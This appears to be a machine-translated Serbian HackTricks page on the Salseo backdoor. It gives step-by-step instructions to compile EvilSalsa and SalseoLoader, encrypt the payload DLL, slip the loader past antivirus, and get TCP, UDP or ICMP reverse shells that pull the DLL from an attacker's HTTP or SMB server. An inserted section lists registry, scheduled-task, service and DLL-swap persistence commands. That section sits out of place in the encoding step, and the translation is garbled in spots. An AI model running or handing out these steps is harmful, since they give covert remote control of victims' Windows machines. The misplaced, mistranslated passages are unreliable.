# Salseo

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Kompajliranje binarnih fajlova

Preuzmite izvorni kod sa github-a i kompajlirajte **EvilSalsa** i **SalseoLoader**. Potrebno je da imate instaliran **Visual Studio** za kompajliranje koda.

Kompajlirajte ove projekte za arhitekturu Windows mašine na kojoj ćete ih koristiti (ako Windows podržava x64, kompajlirajte ih za tu arhitekturu).

Možete **izabrati arhitekturu** unutar Visual Studio-a u **levom "Build" tabu** u **"Platform Target"**.

(\*\*Ako ne možete da pronađete ove opcije, pritisnite na **"Project Tab"** a zatim na **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (132).png>)

Zatim, kompajlirajte oba projekta (Build -> Build Solution) (Unutar logova će se pojaviti putanja do izvršnog fajla):

![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)

## Priprema Backdoor-a

Prvo, morate enkodirati **EvilSalsa.dll**. Za to možete koristiti python skriptu **encrypterassembly.py** ili možete kompajlirati projekat **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows

Windows operativni sistem pruža razne mogućnosti za postavljanje backdoor-a i održavanje pristupa računaru. U nastavku su opisane neke od najčešćih tehnika:

#### 1. Registry backdoor

Ova tehnika uključuje izmenu registra kako bi se omogućio pristup računaru. Možete dodati novi unos u registar koji će se pokrenuti prilikom svakog pokretanja sistema. Na taj način, backdoor će biti aktiviran svaki put kada se računar pokrene.

```plaintext
[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]
"Backdoor"="C:\\path\\to\\backdoor.exe"
```

#### 2. Scheduled Task backdoor

Korišćenje zakazanih zadataka je još jedan način za postavljanje backdoor-a. Možete kreirati novi zakazani zadatak koji će se izvršavati u određeno vreme ili prilikom određenog događaja. Na taj način, backdoor će biti pokrenut automatski prema vašim postavkama.

```plaintext
schtasks /create /sc minute /mo 5 /tn "Backdoor" /tr "C:\\path\\to\\backdoor.exe"
```

#### 3. Service backdoor

Kreiranje backdoor-a kao Windows servisa takođe može biti efikasan način održavanja pristupa računaru. Možete kreirati novi servis koji će se pokretati u pozadini i omogućiti vam pristup računaru.

```plaintext
sc create Backdoor binPath= "C:\\path\\to\\backdoor.exe" start= auto
sc start Backdoor
```

#### 4. DLL backdoor

Manipulacija DLL fajlovima takođe može biti korisna tehnika za postavljanje backdoor-a. Možete zameniti postojeću DLL datoteku sa modifikovanom verzijom koja će omogućiti pristup računaru.

```plaintext
ren C:\\path\\to\\original.dll original.dll.bak
copy C:\\path\\to\\backdoor.dll C:\\path\\to\\original.dll
```

#### 5. Trojan backdoor

Trojanski konj je vrsta zlonamernog softvera koji se maskira kao legitimna aplikacija. Možete koristiti trojanskog konja kao backdoor kako biste dobili pristup računaru. Ova tehnika obično zahteva socijalno inženjering kako bi se žrtva navela da preuzme i pokrene trojanskog konja.

#### 6. Remote Administration Tools (RATs)

RAT alati su softverski alati koji omogućavaju daljinsko upravljanje računarom. Možete koristiti RAT alate kao backdoor kako biste dobili pristup računaru i izvršavali različite komande.

#### 7. Exploiting Vulnerabilities

Iskorišćavanje ranjivosti u Windows operativnom sistemu takođe može dovesti do postavljanja backdoor-a. Pronalaženje i iskorišćavanje ranjivosti može vam omogućiti pristup računaru.

Napomena: Korišćenje ovih tehnika za neovlašćeni pristup računarima je ilegalno i može imati ozbiljne pravne posledice. Ove tehnike su ovde opisane samo u informativne svrhe kako biste bolje razumeli potencijalne ranjivosti i zaštitili svoje računare od napada.
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Dobro, sada imate sve što vam je potrebno da izvršite sve Salseo stvari: **enkodirani EvilDalsa.dll** i **binarni fajl SalseoLoader.**

**Postavite binarni fajl SalseoLoader.exe na mašinu. Ne bi trebalo da bude otkriven od strane antivirus programa...**

## **Izvršite backdoor**

### **Dobijanje TCP reverse shell-a (preuzimanje enkodiranog dll-a putem HTTP-a)**

Ne zaboravite da pokrenete nc kao listener za reverse shell i HTTP server za serviranje enkodiranog evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Dobijanje UDP obrnutog školjka (preuzimanje kodirane dll preko SMB-a)**

Zapamtite da pokrenete nc kao osluškivač obrnutog školjka i SMB server za posluživanje kodirane evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Dobijanje obrnutog školjkaškog pristupa putem ICMP-a (enkodirani dll već prisutan na žrtvi)**

**Ovaj put vam je potreban poseban alat na klijentu za prijem obrnutog školjkaškog pristupa. Preuzmite:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Onemogućavanje ICMP odgovora:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Izvršite klijenta:

```bash
./client
```

Ovom komandom pokrećete klijenta.
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Unutar žrtve, izvršimo salseo stvar:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompajliranje SalseoLoader-a kao DLL koji izvozi glavnu funkciju

Otvorite projekat SalseoLoader koristeći Visual Studio.

### Dodajte ispred glavne funkcije: \[DllExport]

![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Instalirajte DllExport za ovaj projekat

#### **Alati** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**

![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Pretražite DllExport paket (koristeći karticu Browse), i pritisnite Install (i prihvatite popup)**

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png>)

U vašem projekt folderu će se pojaviti fajlovi: **DllExport.bat** i **DllExport\_Configure.bat**

### **Deinstalirajte** DllExport

Pritisnite **Uninstall** (da, čudno je ali verujte mi, neophodno je)

![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)

### **Izađite iz Visual Studio-a i izvršite DllExport\_configure**

Jednostavno **izađite** iz Visual Studio-a

Zatim, idite u vaš **SalseoLoader folder** i **izvršite DllExport\_Configure.bat**

Izaberite **x64** (ako ćete ga koristiti unutar x64 sistema, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Apply**

![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)

### **Otvorite projekat ponovo sa Visual Studio-om**

**\[DllExport]** više ne bi trebalo biti označeno kao greška

![](<../.gitbook/assets/image (8) (1).png>)

### Izgradite rešenje

Izaberite **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)

![](<../.gitbook/assets/image (10) (1).png>)

Izaberite **x64** **platformu** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)

![](<../.gitbook/assets/image (9) (1) (1).png>)

Da biste **izgradili** rešenje: Build --> Build Solution (Unutar Output konzole će se pojaviti putanja nove DLL datoteke)

### Testirajte generisanu Dll

Kopirajte i nalepite DLL gde želite da je testirate.

Izvršite:
```
rundll32.exe SalseoLoader.dll,main
```
Ako se ne pojavi greška, verovatno imate funkcionalnu DLL datoteku!!

## Dobijanje shell-a korišćenjem DLL datoteke

Ne zaboravite da koristite **HTTP** **server** i postavite **nc** **listener**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

CMD (Command Prompt) je ugrađeni alat u operativnom sistemu Windows koji omogućava korisnicima da komuniciraju sa sistemom putem naredbi. CMD se često koristi u hakovanju kao sredstvo za izvršavanje različitih komandi i skripti radi postizanja određenih ciljeva. Ovaj alat može biti veoma moćan i omogućava hakerima da manipulišu sistemom, preuzimaju kontrolu nad njim i izvršavaju različite akcije. CMD se može koristiti za pretragu fajlova, pokretanje programa, pristupanje mrežnim resursima, promenu postavki sistema i još mnogo toga. Hakeri često koriste CMD za izvršavanje različitih napada, kao što su backdoor napadi, keylogging, preuzimanje kontrola nad sistemom i mnoge druge tehnike. Važno je napomenuti da je korišćenje CMD-a u nelegalne svrhe ilegalno i može imati ozbiljne pravne posledice.
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
